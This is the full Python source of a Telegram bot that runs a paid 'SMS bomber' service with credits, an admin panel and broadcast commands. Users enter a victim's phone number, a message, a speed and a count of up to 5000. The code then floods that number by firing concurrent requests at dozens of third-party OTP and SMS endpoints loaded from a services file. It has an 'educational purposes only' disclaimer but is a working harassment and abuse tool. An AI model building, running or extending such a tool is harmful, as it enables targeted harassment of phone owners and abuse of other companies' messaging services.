#!/usr/bin/env python
# ULTIMATE BOMBER BOT - COMPLETE UI
# (c) @lordzenox | @zenoxtool

import os, sys, json, time, random, threading, logging, requests, concurrent.futures
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

from config import *
from database import *

# Disable logging
logging.basicConfig(level=logging.ERROR)
sys.stderr = open(os.devnull, 'w')

# ========== GLOBALS ==========
stop_bombing = {}
total_requests = {}
current_target = {}

# ========== LOAD SERVICES ==========
def load_services():
    try:
        with open('services.json', 'r') as f:
            data = json.load(f)
            return data.get('services', [])
    except:
        return []

SERVICES = load_services()
print(f"✅ Loaded {len(SERVICES)} services")

# ========== BOMBING ENGINE ==========
def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91":
        return f"+91{p}"
    if fmt == "91-":
        return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc.get('method', 'POST').upper()
    url = svc.get('url', '').replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    
    if data:
        if '_raw' in data:
            raw = data['_raw'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
            try:
                import ast
                data = ast.literal_eval(raw)
            except:
                pass
        else:
            data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=2)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=2)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb_thread(phone, total, user_id):
    global stop_bombing, total_requests
    total_requests[user_id] = 0
    services = SERVICES.copy()
    random.shuffle(services)
    
    sent = 0
    success = 0
    failed = 0
    
    def send_one(svc):
        try:
            return send_request(svc, phone)
        except:
            return False
    
    while sent < total and not stop_bombing.get(user_id, False):
        batch_size = 30
        batch = services[:batch_size]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            results = executor.map(send_one, batch)
            for ok in results:
                if stop_bombing.get(user_id, False) or sent >= total:
                    break
                if ok:
                    success += 1
                else:
                    failed += 1
                sent += 1
                total_requests[user_id] = sent
                if sent >= total:
                    break
        
        random.shuffle(services)
        time.sleep(0.005)
    
    add_bomb_stats(user_id, phone, sent, success, failed)
    return sent, success, failed

# ========== START COMMAND ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if not get_user(user_id):
        created, msg = create_user(user_id, user.username or user.first_name, user.first_name)
        if not created:
            await update.message.reply_text("❌ Error creating user.")
            return
    
    stats = get_user_stats(user_id)
    coins = get_balance(user_id)
    ref_count = get_referral_count(user_id)
    
    msg = f"""🔥 **{BOT_NAME}**
💀 **ULTIMATE SMS BOMBER {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)}**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

💀 **TAP START TO BEGIN**"""

    keyboard = [
        [InlineKeyboardButton("🚀 START BOMBING", callback_data="start_bombing")],
        [InlineKeyboardButton("📊 APIS", callback_data="apis")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

# ========== ADMIN PANEL ==========
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized! Only admin can access.")
        return
    
    users = get_all_users(limit=30)
    
    if not users:
        await update.message.reply_text("📊 No users found.")
        return
    
    msg = "🔐 **ADMIN PANEL**\n"
    msg += "═" * 35 + "\n\n"
    msg += "👥 **ACTIVE USERS**\n"
    msg += "─────────────────────\n"
    msg += "`# | ID | Username | Coins | Bombs | Status`\n"
    msg += "─────────────────────\n"
    
    count = 1
    for uid, username, coins, bombs, sms in users[:20]:
        if is_admin(uid):
            role = "👑 ADMIN"
        elif is_banned(uid):
            role = "🚫 BANNED"
        else:
            role = "✅ USER"
        uname = username[:12] if username else "Unknown"
        msg += f"`{count:2} | {uid} | {uname} | {coins:3} | {bombs:3} | {role}`\n"
        count += 1
    
    msg += "\n─────────────────────\n"
    stats = get_total_stats()
    msg += f"📊 **Total Users:** {stats['users']}\n"
    msg += f"💰 **Total Coins:** {stats['coins']}\n"
    msg += f"💣 **Total Bombs:** {stats['bombs']}\n"
    msg += f"📱 **Total SMS:** {stats['sms']}\n"
    
    keyboard = [
        [InlineKeyboardButton("📊 FULL STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("👥 ALL USERS", callback_data="admin_users")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back_main")],
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ========== ADMIN CALLBACKS ==========
async def admin_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized!")
        return
    stats = get_total_stats()
    msg = f"📊 **FULL STATISTICS**\n═" * 30 + "\n\n"
    msg += f"👥 **Total Users:** {stats['users']}\n"
    msg += f"💰 **Total Coins:** {stats['coins']}\n"
    msg += f"💣 **Total Bombs:** {stats['bombs']}\n"
    msg += f"📱 **Total SMS:** {stats['sms']}\n"
    msg += f"👑 **Admins:** {stats['admins']}\n"
    msg += f"🚫 **Banned:** {stats['banned']}\n"
    msg += f"📡 **APIs:** {len(SERVICES)}\n"
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="admin_back")]]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def admin_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized!")
        return
    users = get_all_users(limit=50)
    if not users:
        await query.edit_message_text("📊 No users found.")
        return
    msg = "👥 **ALL USERS**\n═" * 30 + "\n\n"
    for uid, username, coins, bombs, sms in users[:50]:
        uname = username[:15] if username else "Unknown"
        role = "👑" if is_admin(uid) else "🚫" if is_banned(uid) else "👤"
        msg += f"{role} `{uid}` | **{uname}** | 💰{coins} | 💣{bombs}\n"
    msg += "\n─────────────────────\n"
    msg += f"📊 Showing {min(50, len(users))} users"
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="admin_back")]]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def admin_back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await admin(update, context)

# ========== CALLBACK HANDLER ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await query.edit_message_text("🚫 You are banned.")
        return
    
    data = query.data
    
    if data == "start_bombing":
        context.user_data['step'] = 'number'
        await query.edit_message_text(
            "📱 **STEP 1/4 – NUMBER**\n\n"
            "Jis number pe SMS bhejna hai woh enter karo:\n"
            "*Example:* +919876543210\n\n"
            "⏳ Send the number in 60 seconds.",
            parse_mode="Markdown"
        )
    
    elif data == "apis":
        msg = f"📊 **APIs Loaded:** {len(SERVICES)}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "info":
        msg = f"""ℹ️ **About {BOT_NAME}**

💀 **Version:** {BOT_VERSION}
👑 **Owner:** {OWNER}
📡 **APIs:** {len(SERVICES)}
📢 **Channels:** {CHANNEL1} | {CHANNEL2}

⚠️ **Disclaimer:** For educational purposes only."""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "back_main":
        stats = get_user_stats(user_id)
        coins = get_balance(user_id)
        msg = f"""🔥 **{BOT_NAME}**
💀 **ULTIMATE SMS BOMBER {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)}**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

💀 **TAP START TO BEGIN**"""
        keyboard = [
            [InlineKeyboardButton("🚀 START BOMBING", callback_data="start_bombing")],
            [InlineKeyboardButton("📊 APIS", callback_data="apis")],
            [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "speed_fast":
        context.user_data['speed'] = 'fast'
        await speed_selected(query, context)
    
    elif data == "speed_medium":
        context.user_data['speed'] = 'medium'
        await speed_selected(query, context)
    
    elif data == "speed_slow":
        context.user_data['speed'] = 'slow'
        await speed_selected(query, context)
    
    elif data.startswith("count_"):
        count = int(data.split("_")[1])
        await start_bombing_process(query, context, count)
    
    elif data == "count_custom":
        context.user_data['step'] = 'custom_count'
        await query.edit_message_text(
            "📊 **Enter custom count**\n\n"
            "Send the number of SMS you want to send.\n"
            "Example: `50`\n\n"
            "⏳ Max: 5000",
            parse_mode="Markdown"
        )
    
    elif data == "stop_bombing":
        user_id = query.from_user.id
        stop_bombing[user_id] = True
        await query.edit_message_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")
    
    elif data == "admin_stats":
        await admin_stats_callback(update, context)
    elif data == "admin_users":
        await admin_users_callback(update, context)
    elif data == "admin_back":
        await admin_back_callback(update, context)

async def speed_selected(query, context):
    user_id = query.from_user.id
    phone = context.user_data.get('phone', '')
    speed = context.user_data.get('speed', 'medium')
    
    total_apis = len(SERVICES)
    device_capacity = total_apis * 3
    credits = get_balance(user_id)
    
    msg = f"""⚡ **{speed.upper()} selected!**

**STEP 4/4 – COUNT**
📡 Online APIs : {total_apis}
📱 Device Capacity: {device_capacity} SMS
💰 Your Credits: {credits}

Kitne SMS bhejna hai?"""
    
    keyboard = [
        [InlineKeyboardButton("10", callback_data="count_10"),
         InlineKeyboardButton("25", callback_data="count_25"),
         InlineKeyboardButton("50", callback_data="count_50")],
        [InlineKeyboardButton("100", callback_data="count_100"),
         InlineKeyboardButton("250", callback_data="count_250"),
         InlineKeyboardButton("500", callback_data="count_500")],
        [InlineKeyboardButton("1000", callback_data="count_1000"),
         InlineKeyboardButton("✏️ CUSTOM", callback_data="count_custom")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def start_bombing_process(query, context, count):
    user_id = query.from_user.id
    phone = context.user_data.get('phone', '')
    speed = context.user_data.get('speed', 'medium')
    msg_text = context.user_data.get('msg', '')
    
    coins = get_balance(user_id)
    if coins < BOMB_COST:
        await query.edit_message_text(
            f"❌ **Insufficient Credits!**\n"
            f"💰 Your Balance: {coins}\n"
            f"💸 Cost per bomb: {BOMB_COST} credits\n\n"
            f"Use /buy to purchase more credits.",
            parse_mode="Markdown"
        )
        return
    
    if not deduct_coins(user_id, BOMB_COST, f"Bomb on +91{phone}"):
        await query.edit_message_text("❌ Failed to deduct credits.")
        return
    
    stop_bombing[user_id] = False
    
    msg = f"""🔄 **SENDING SMS...**

📱 Target: +91{phone}
📊 Count: {count}
⚡ Speed: {speed.upper()}
📝 Message: {msg_text if msg_text else 'None'}

📊 Progress: 0% | SENT: 0 | FAILED: 0

🛑 Stop button dabayein agar beech mein rokna ho."""
    
    keyboard = [[InlineKeyboardButton("🛑 STOP SENDING", callback_data="stop_bombing")]]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    def run_bomb():
        sent, success, failed = bomb_thread(phone, count, user_id)
        if stop_bombing.get(user_id, False):
            final_msg = f"""⛔ **STOPPED!**

📱 Target: +91{phone}
📊 Sent: {sent}
✅ Success: {success}
❌ Failed: {failed}
⚡ Speed: {speed.upper()}
📝 Message: {msg_text if msg_text else 'None'}"""
        else:
            final_msg = f"""✅ **SMS SENT!**

📱 Target: +91{phone}
📊 Sent: {sent}
✅ Success: {success}
❌ Failed: {failed}
⚡ Speed: {speed.upper()}
📝 Message: {msg_text if msg_text else 'None'}

📢 {CHANNEL1} | {CHANNEL2}"""
        try:
            query.edit_message_text(final_msg, parse_mode="Markdown")
        except:
            pass
    
    threading.Thread(target=run_bomb, daemon=True).start()

# ========== MESSAGE HANDLER ==========
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    
    step = context.user_data.get('step', '')
    
    if step == 'number':
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) >= 10:
            phone = phone[-10:]
            context.user_data['phone'] = phone
            context.user_data['step'] = 'message'
            await update.message.reply_text(
                f"✅ **Number:** +91{phone}\n\n"
                "**STEP 2/4 – MESSAGE**\n"
                "Jo message bhejna hai woh type karo:\n"
                "(Optional — type 'skip' to skip)",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Invalid number! Enter 10-digit number.")
    
    elif step == 'message':
        if text.lower() == 'skip':
            context.user_data['msg'] = ''
        else:
            context.user_data['msg'] = text
        context.user_data['step'] = 'speed'
        msg = f"""**STEP 3/4 – SPEED**
Sending speed select karein:"""
        keyboard = [
            [InlineKeyboardButton("🚀 FAST", callback_data="speed_fast")],
            [InlineKeyboardButton("⚡ MEDIUM", callback_data="speed_medium")],
            [InlineKeyboardButton("🐢 SLOW", callback_data="speed_slow")],
        ]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif step == 'custom_count':
        try:
            count = int(text)
            if count < 1 or count > 5000:
                await update.message.reply_text("❌ Enter 1-5000.")
                return
            context.user_data['step'] = None
            await start_bombing_direct(update, context, count)
        except ValueError:
            await update.message.reply_text("❌ Invalid count! Enter a number.")
    
    else:
        await update.message.reply_text("❌ Use /start to begin.")

async def start_bombing_direct(update, context, count):
    user_id = update.effective_user.id
    phone = context.user_data.get('phone', '')
    speed = context.user_data.get('speed', 'medium')
    msg_text = context.user_data.get('msg', '')
    
    coins = get_balance(user_id)
    if coins < BOMB_COST:
        await update.message.reply_text(
            f"❌ **Insufficient Credits!**\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}",
            parse_mode="Markdown"
        )
        return
    
    if not deduct_coins(user_id, BOMB_COST, f"Bomb on +91{phone}"):
        await update.message.reply_text("❌ Failed to deduct credits.")
        return
    
    stop_bombing[user_id] = False
    await update.message.reply_text(
        f"🔄 **SENDING SMS...**\n📱 +91{phone}\n📊 {count} SMS\n⚡ {speed.upper()}\n🛑 Type /stop to stop.",
        parse_mode="Markdown"
    )
    
    def run_bomb():
        sent, success, failed = bomb_thread(phone, count, user_id)
        final_msg = f"""✅ **SMS SENT!**
📱 +91{phone}
📊 Sent: {sent}
✅ Success: {success}
❌ Failed: {failed}
⚡ Speed: {speed.upper()}
📝 Message: {msg_text if msg_text else 'None'}"""
        update.message.reply_text(final_msg, parse_mode="Markdown")
    
    threading.Thread(target=run_bomb, daemon=True).start()

# ========== STOP COMMAND ==========
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_bombing[user_id] = True
    await update.message.reply_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")

# ========== HELP COMMAND ==========
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """📌 **Available Commands:**
/start - Start bot
/stop - Stop bombing
/balance - Check credits
/help - Show help
/status - Bot status
/admin - Admin panel (admin only)"""
    await update.message.reply_text(msg, parse_mode="Markdown")

# ========== BALANCE COMMAND ==========
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    coins = get_balance(user_id)
    await update.message.reply_text(f"💰 **Your Balance:** {coins} credits", parse_mode="Markdown")

# ========== STATUS COMMAND ==========
async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = f"""📊 **Bot Status**
🤖 {BOT_NAME}
📡 APIs: {len(SERVICES)}
👑 Owner: {OWNER}
📢 {CHANNEL1} | {CHANNEL2}
⏰ Online"""
    await update.message.reply_text(msg, parse_mode="Markdown")

# ========== ADDCOINS COMMAND ==========
async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    add_coins(target_id, amount, f"Admin added {amount} credits")
    await update.message.reply_text(f"✅ Added **{amount}** credits to `{target_id}`", parse_mode="Markdown")

# ========== BROADCAST COMMAND ==========
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    message = " ".join(context.args)
    users = get_all_users()
    sent = 0
    for uid, username, coins, bombs, sms in users:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            sent += 1
            time.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

# ========== MAIN ==========
def main():
    make_admin(ADMIN_ID)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("addcoins", addcoins))
    app.add_handler(CommandHandler("broadcast", broadcast))
    
    # Callbacks & Messages
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 50)
    print(f"🤖 {BOT_NAME} ({BOT_VERSION})")
    print(f"📊 Loaded {len(SERVICES)} APIs")
    print(f"👑 Owner: {OWNER}")
    print(f"📢 Channels: {CHANNEL1} | {CHANNEL2}")
    print("=" * 50)
    app.run_polling()

if __name__ == "__main__":
    main()
